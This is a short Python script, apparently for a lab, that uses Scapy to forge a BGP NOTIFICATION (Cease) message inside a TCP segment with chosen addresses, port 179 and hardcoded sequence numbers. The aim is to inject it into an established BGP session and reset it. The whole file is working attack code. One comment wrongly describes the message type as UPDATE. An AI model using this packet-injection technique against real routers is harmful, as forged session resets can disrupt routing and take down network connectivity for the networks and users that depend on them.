from scapy.layers.inet import IP, TCP
from scapy.contrib.bgp import BGPHeader, BGPNotification
from scapy.sendrecv import send

"""
_bgp_message_types = {
    0: "NONE",
    1: "OPEN",
    2: "UPDATE",
    3: "NOTIFICATION",
    4: "KEEPALIVE",
    5: "ROUTE-REFRESH"
}
"""
bgp_type = 3
src_ipv4_addr = '192.168.80.1'  # eth0
dst_ipv4_addr = '192.168.80.254'
established_port = 12345    # random port
current_seq_num = 1500  # seq
expected_seq_num = 1000  # ack
error_code = 6
error_subcode = 5
data = b'hello-world'

# proto=6 represents that, TCP will be travelling above this layer. This is simple IPV4 communication.
base = IP(src=src_ipv4_addr, dst=dst_ipv4_addr, proto=6, ttl=255)
# dport=179 means, we are communicating with bgp port of the destination router/ host. sport is a random port over which tcp is established. seq and ack are the sequence number and acknowledgement numbers. flags = PA are the PUSH and ACK flags.
tcp = TCP(sport=established_port, dport=179,
          seq=current_seq_num, ack=expected_seq_num, flags='PA')
# type=2 means UPDATE packet will be the BGP Payload, marker field is for authentication. max hex int (all f) are used for no auth.
hdr = BGPHeader(type=bgp_type, marker=0xffffffffffffffffffffffffffffffff)

up = BGPNotification(error_code=error_code,
                     error_subcode=error_subcode, data=data)

packet = base / tcp / hdr / up

send(packet, iface='VMware Network Adapter VMnet8')
